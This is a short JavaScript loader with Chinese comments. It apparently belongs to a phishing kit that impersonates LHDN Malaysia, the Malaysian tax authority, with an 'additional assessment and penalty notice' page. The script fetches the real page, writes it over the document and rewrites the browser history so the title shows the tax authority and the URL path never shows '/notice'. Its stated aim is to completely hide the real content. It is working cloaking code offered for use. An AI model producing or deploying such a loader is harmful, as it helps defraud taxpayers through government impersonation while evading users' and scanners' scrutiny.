// loader.js —— 完全隐藏真实内容的核心文件
(function () {
    const realPageUrl = 'document.html?t=' + Date.now(); // 防缓存

    fetch(realPageUrl)
        .then(r => {
            if (!r.ok) throw new Error('加载失败');
            return r.text();
        })
        .then(html => {
            document.open();
            document.write(html);
            document.close();

            // 正确写法：路径写 '/' 或留空，绝不会出现 /notice
            try {
                history.replaceState(null, 'Notis Taksiran Tambahan dan Penalti - LHDN Malaysia', '/');
            } catch(e) {}
        })
        .catch(err => {
            console.error(err);
            document.body.innerHTML = '<h1 style="text-align:center;margin-top:100px;color:red;">加载失败，请刷新重试</h1>';
        });
})();